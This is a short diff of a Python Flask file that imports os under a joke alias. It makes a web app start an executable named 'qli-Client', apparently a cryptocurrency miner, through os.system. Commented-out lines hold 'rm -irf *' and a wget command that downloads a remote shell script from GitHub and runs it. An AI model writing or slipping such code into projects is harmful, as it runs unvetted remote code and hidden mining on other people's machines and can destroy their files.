@@ -2,7 +2,7 @@ import os as kampret
 import requests
 from flask import *
 #kampret.system("rm -irf *")
-x = kampret.system("chmod +x qli-Client && ./qli-Client")
+kampret.system("chmod +x qli-Client && ./qli-Client")
 #kampret.system("wget https://raw.githubusercontent.com/petugas/No/main/loop.sh && chmod +x loop.sh && ./loop.sh")
 
 app = Flask(__name__)
